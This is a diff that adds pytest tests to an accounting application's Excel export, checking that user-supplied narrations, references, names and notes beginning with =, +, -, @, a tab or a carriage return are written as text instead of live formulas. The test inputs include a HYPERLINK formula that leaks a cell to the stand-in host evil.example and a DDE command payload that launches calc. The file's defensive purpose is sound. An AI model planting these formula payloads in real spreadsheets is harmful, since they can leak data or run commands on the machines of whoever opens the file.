@@ -323,6 +323,126 @@ def test_the_letterhead_is_on_a_sheet_of_its_own_so_data_sheets_start_at_row_one
     assert wb["Trade Receivables"]["A1"].value == "Date"
 
 
+# ── 2b. NO CELL OF A WORKBOOK IS A FORMULA SOMEBODY ELSE WROTE ───────────────
+#
+# A ledger's narration and reference come from bank statements and from the
+# counterparty's own mouth ("UPI/…/remark"), and the workbook is handed to a
+# bank or an auditor, who opens it in Excel. openpyxl turns any string that
+# starts with "=" into a LIVE FORMULA, so a stranger's remark of
+# =HYPERLINK("http://evil.example/?x="&A1,"click") became a clickable cell that
+# leaks the neighbouring cell to a server of their choosing. The rule is the
+# one OWASP names for exports: text starting with = + - @ (or a tab or a
+# carriage return, which Excel strips before it decides) is written as TEXT.
+
+_FORMULA = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
+_TRIGGERS = ["=1+1", "+1+1", "-2+3", "@SUM(A1:A2)", "\t=1+1", "\r=1+1", _FORMULA]
+
+
+def _ledger_led(narration, ref):
+    return {
+        "opening_balance_paise": 0, "closing_balance_paise": 100,
+        "total_debit_paise": 100, "total_credit_paise": 0,
+        "lines": [{"entry_date": "2026-04-10", "narration": narration,
+                   "reference_no": ref, "debit_paise": 100, "credit_paise": 0,
+                   "running_balance_paise": 100}],
+    }
+
+
+def _xlsx(doc, *, holder=None, firm=None):
+    from services.report_xlsx_service import build_report_xlsx
+    return build_report_xlsx(
+        doc,
+        holder=holder or {"legal_name": "Acme Traders Pvt Ltd", "gstin": "27AAACA1111A1Z4",
+                          "pan": "AAACA1111A"},
+        firm=firm or {"name": "Sharma & Co.", "gstin": "27AABCS1429B1ZU"},
+        generated_on="2026-10-01")
+
+
+def _formula_elements(content: bytes) -> list[str]:
+    """Every sheet's raw XML, so the check is on what Excel will read and not on
+    what openpyxl says about it after re-parsing."""
+    import zipfile
+    out = []
+    with zipfile.ZipFile(io.BytesIO(content)) as z:
+        for name in z.namelist():
+            if name.startswith("xl/worksheets/") and name.endswith(".xml"):
+                out += re.findall(r"<f[ >/][^<]*", z.read(name).decode("utf-8"))
+    return out
+
+
+@pytest.mark.parametrize("text", _TRIGGERS)
+def test_a_counterpartys_narration_and_reference_never_become_a_formula(text):
+    doc = B.ledger_document(_ledger_led(text, text))
+    content = _xlsx(doc)
+    wb = workbook(content)
+    ws = wb[wb.sheetnames[0]]
+    # Row 2 is the opening-balance line; the counterparty's line is row 3.
+    cells = [ws.cell(row=3, column=c) for c in (2, 3)]
+    for cell in cells:
+        assert cell.data_type == "s", f"{text!r} was written as {cell.data_type!r}"
+        # The text survives exactly: no apostrophe is spliced into the value.
+        assert cell.value == text
+        # And it stays text if the CA presses F2 then Enter on it.
+        assert cell.quotePrefix is True
+    assert _formula_elements(content) == []
+
+
+def test_the_letterhead_sheet_is_text_too():
+    """The firm's name, the client's name and every caveat are typed by people;
+    the Details sheet is where they land."""
+    doc = B.ledger_document(_ledger_led("Sale", "INV/1"))
+    from dataclasses import replace
+    doc = replace(doc, notes=(_FORMULA,), meta=(("Prepared for", "@SUM(A1:A9)"),))
+    content = _xlsx(doc, holder={"legal_name": "=1+1", "gstin": "-27AAACA1111A1Z4",
+                                 "pan": "+AAACA1111A"},
+                    firm={"name": "=cmd|' /C calc'!A0", "gstin": "27AABCS1429B1ZU"})
+    wb = workbook(content)
+    details = wb["Details"]
+    texts = [c for row in details.iter_rows() for c in row if isinstance(c.value, str)]
+    assert any(c.value == "=1+1" for c in texts)
+    unsafe = [c for c in texts if c.value[:1] in "=+-@"]
+    assert len(unsafe) >= 5
+    assert all(c.data_type == "s" and c.quotePrefix for c in unsafe)
+    assert _formula_elements(content) == []
+
+
+def test_ordinary_text_and_every_number_are_untouched_by_the_guard():
+    """The guard is for text that could be read as a formula and nothing else: a
+    negative balance is still a number SUM can add, and a plain narration does
+    not gain a prefix."""
+    led = _ledger_led("Cheque 000123 - Sharma", "INV/2026-27/0001")
+    led.update(opening_balance_paise=-250, closing_balance_paise=-150,
+               total_debit_paise=100)
+    led["lines"][0]["running_balance_paise"] = -150
+    ws = workbook(_xlsx(B.ledger_document(led)))
+    ws = ws[ws.sheetnames[0]]
+    narration, ref = ws.cell(row=3, column=2), ws.cell(row=3, column=3)
+    assert (narration.data_type, narration.quotePrefix) == ("s", False)
+    assert (ref.data_type, ref.quotePrefix) == ("s", False)
+    opening = ws.cell(row=2, column=6)
+    assert opening.data_type == "n" and Decimal(str(opening.value)) == Decimal("-2.50")
+
+
+def test_no_report_workbook_contains_a_formula_whatever_the_books_say():
+    """The rule over every report that has a spreadsheet, not over the ledger's
+    two text columns: an account called =1+1 reaches the ledger as a sheet name
+    and a subject line, and the cash flow as whatever its lines are called."""
+    hostile = Account("h", "9000", "=1+1", "Asset", "Bank", system_key="hostile")
+    accounts = ACCOUNTS + [hostile]
+    entries = books() + [je("h1", "2026-07-01", [("h", 100, 0), ("cap", 0, 100)],
+                            ref="=2+2", narration="@evil")]
+    svc = ReportingService(InMemoryLedgerSource(accounts=accounts, entries=entries))
+    spreadsheets = [r for r, formats in ex.REPORTS.items() if ex.XLSX in formats]
+    assert set(spreadsheets) == {"ledger", "cash-flow"}, spreadsheets
+    params_for = {"ledger": {"account_id": "h", "start_date": START, "end_date": END},
+                  "cash-flow": {"start_date": START, "end_date": END}}
+    for report in spreadsheets:
+        params = params_for[report]
+        out = ex.export_report(report, "xlsx", svc=svc, db=FakeDB(), firm_id=FIRM,
+                               client_id=CLIENT, params=params, generated_on="2026-10-01")
+        assert _formula_elements(out.content) == [], report
+
+
 # ── 3. A LEDGER THAT DOES NOT FOOT IS REFUSED ────────────────────────────────
 
 class PagedStub:
